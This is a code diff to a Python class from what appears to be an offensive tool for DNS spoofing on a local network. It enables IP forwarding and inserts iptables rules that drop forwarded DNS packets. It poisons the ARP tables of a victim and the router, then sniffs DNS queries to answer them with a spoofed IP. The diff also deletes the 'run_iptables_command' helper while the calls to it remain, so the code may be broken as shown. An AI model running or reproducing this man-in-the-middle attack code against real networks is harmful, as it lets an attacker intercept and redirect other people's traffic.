@@ -15,33 +15,20 @@ class dns:
         if ip_forwarding:
             print("Enabling IP forwarding")
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-            dns.run_iptables_command("sudo iptables -I FORWARD 1 -p udp --dport 53 -j DROP")
-            dns.run_iptables_command("sudo iptables -I FORWARD 2 -i %s -o %s -j ACCEPT" % (interface, interface))
-            dns.run_iptables_command("sudo iptables -I FORWARD 3 -o %s -i %s -j ACCEPT" % (interface, interface))
+            run_iptables_command("sudo iptables -I FORWARD 1 -p udp --dport 53 -j DROP")
+            run_iptables_command("sudo iptables -I FORWARD 2 -i %s -o %s -j ACCEPT" % (interface, interface))
+            run_iptables_command("sudo iptables -I FORWARD 3 -o %s -i %s -j ACCEPT" % (interface, interface))
             
         else:
             print("Disabling IP forwarding")
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
             try:
-                dns.run_iptables_command("sudo iptables -D FORWARD -i %s -o %s -j ACCEPT" % (interface, interface))
-                dns.run_iptables_command("sudo iptables -D FORWARD -o %s -i %s -j ACCEPT" % (interface, interface))
-                dns.run_iptables_command("sudo iptables -D FORWARD -p udp --dport 53 -j DROP")
+                run_iptables_command("sudo iptables -D FORWARD -i %s -o %s -j ACCEPT" % (interface, interface))
+                run_iptables_command("sudo iptables -D FORWARD -o %s -i %s -j ACCEPT" % (interface, interface))
+                run_iptables_command("sudo iptables -D FORWARD -p udp --dport 53 -j DROP")
             except Exception as e:
                 print("WARNING: could not remove iptables rules, manual cleanup required")
                 raise
-
-    @staticmethod
-    def run_iptables_command(command):
-        """
-        Function to execute iptables commands, with error handling
-        """
-        try:
-            result = subprocess.check_call(command, shell=True)
-        except subprocess.CalledProcessError as e:
-            print("error executing command: '%s', manually add or remove rule" % command)
-            raise
-        except Exception as e:
-            raise
 
     @staticmethod
     def send_spoof_packet(packet, domain, spoofed_ip):
@@ -113,7 +100,6 @@ class dns:
             dns.set_ip_forwarding(True, interface)
             conf.route.resync()
             router_ip = conf.route.route("0.0.0.0")[2]
-            print("Router ip: %s" % router_ip)
             arp1 = arp()
             arp1.two_way_arp_spoof(victim_ip, router_ip, 2, interface)
             sniff(filter="udp and port 53", prn=lambda pkt: dns.handle_packet(pkt, domain, spoofed_ip, victim_ip, router_ip), store=0, iface=interface)
